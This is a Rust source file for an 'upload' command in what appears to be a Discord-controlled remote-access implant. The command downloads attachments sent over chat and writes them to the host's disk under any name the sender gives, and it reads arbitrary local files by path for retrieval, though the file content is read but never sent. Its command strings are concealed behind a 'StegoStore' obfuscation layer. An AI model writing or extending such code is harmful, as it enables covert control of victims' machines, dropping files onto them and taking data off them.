use serde_json;
use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use crate::config::Config;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct UploadCommand;

impl UploadCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for UploadCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("UP_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "UPLOAD").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("UP_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".upload snaky.pdf", ".upload save snaky_file.zip"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("UP_ALIAS1").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        if !msg.attachments.is_empty() {
            return self.handle_attachment_save(http, msg, args).await;
        }

        let args_string = args.rest();
        let mut parts = args_string.trim().split_whitespace();
        let first_arg = parts.next().unwrap_or("");

        if first_arg == "save" {
            let filename = parts.collect::<Vec<_>>().join(" ");
            if filename.is_empty() {
                http.create_message(msg.channel_id.get(), &Self::f("UP_ERR_FILENAME")).await?;
                return Ok(());
            }
            return self.handle_attachment_download(http, msg, &filename).await;
        }

        if first_arg.is_empty() {
            http.create_message(msg.channel_id.get(), &Self::f("UP_ERR_USAGE")).await?;
            return Ok(());
        }

        let file_path = args_string.trim();

        self.handle_file_upload(http, msg, file_path).await
    }
}

impl UploadCommand {
    async fn handle_attachment_save(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        args: Arguments,
    ) -> Result<()> {
        let attachment = &msg.attachments[0]; // Get first attachment
        let filename_owned = args.rest();
        let filename = filename_owned.trim();

        let save_filename = if filename.is_empty() {
            &attachment.filename
        } else {
            filename
        };

        let response_msg = http
            .create_message(
                msg.channel_id.into(),
                &Self::f("UP_DOWNLOADING")
                    .replace("{}", &attachment.filename)
                    .replace("{}", save_filename)
            )
            .await?;
        let response_message: Message = serde_json::from_str(&response_msg)?;

        let client = reqwest::Client::new();
        match client.get(&attachment.url).send().await {
            Ok(resp) => {
                if resp.status().is_success() {
                    let bytes = resp.bytes().await?;

                    match fs::write(save_filename, &bytes) {
                        Ok(_) => {
                            let file_size_mb = bytes.len() as f64 / (1024.0 * 1024.0);
                            http.update_message(msg.channel_id, response_message.id, Some(Self::f("UP_SUCCESS_SAVE")
                                .replacen("{}", save_filename, 1)
                                .replacen("{}", &format!("{:.2}", file_size_mb), 1)
                            )).await?;
                        }
                        Err(e) => {
                            http.update_message(msg.channel_id, response_message.id, Some(format!("{}: {}", Self::f("UP_ERR_SAVE"), e))).await?;
                        }
                    }
                } else {
                    http.update_message(msg.channel_id, response_message.id, Some(format!(
                            "{}: {}",
                            Self::f("UP_ERR_STATUS"),
                            resp.status()
                        )))
                        .await?;
                }
            }
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id, Some(format!(
                        "{}: {}",
                        Self::f("UP_ERR_SAVE"),
                        e
                    )))
                    .await?;
            }
        }

        Ok(())
    }

    async fn handle_attachment_download(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        _filename: &str,
    ) -> Result<()> {
        http.create_message(msg.channel_id.get(), &Self::f("UP_INFO_NOT_IMPL")).await?;
        Ok(())
    }

    // Handle uploading local files to Discord
    async fn handle_file_upload(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        file_path: &str,
    ) -> Result<()> {
        let path = Path::new(file_path);

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("PATH_NOT_FOUND"), file_path)).await?;
            return Ok(());
        }

        if !path.is_file() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("ERR_PATH_NOT_FILE"), file_path)).await?;
            return Ok(());
        }

        // Get file metadata
        let metadata = fs::metadata(path)?;
        let file_size = metadata.len();

        // Check Discord's file size limit
        let max_size = Config::get_max_bfilesize() as u64;
        if file_size > max_size {
            http.create_message(msg.channel_id.get(), &Self::f("UP_ERR_LARGE")).await?;
            return Ok(());
        }

        let response_msg = http
            .create_message(msg.channel_id.into(), &Self::f("UP_UPLOADING").replace("{}", file_path)).await?;
        let response_message: Message = serde_json::from_str(&response_msg)?;
        let _file_content = fs::read(path)?;

        let filename = path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("uploaded_file");

        let file_size_mb = file_size as f64 / (1024.0 * 1024.0);

        match http.create_message(msg.channel_id.get(), &Self::f("UP_SUCCESS_READY")
            .replacen("{}", filename, 1)
            .replacen("{}", &format!("{:.2}", file_size_mb), 1)
        ).await {
                Ok(_) => {
                    // Delete the "uploading" message
                    let _ = http.delete_message(msg.channel_id, response_message.id).await;
                }
                Err(e) => {
                    http.update_message(msg.channel_id, response_message.id, Some(format!("{}: {}", Self::f("CAT_ERR_READ"), e))).await?;
                }
            }

        Ok(())
    }
}



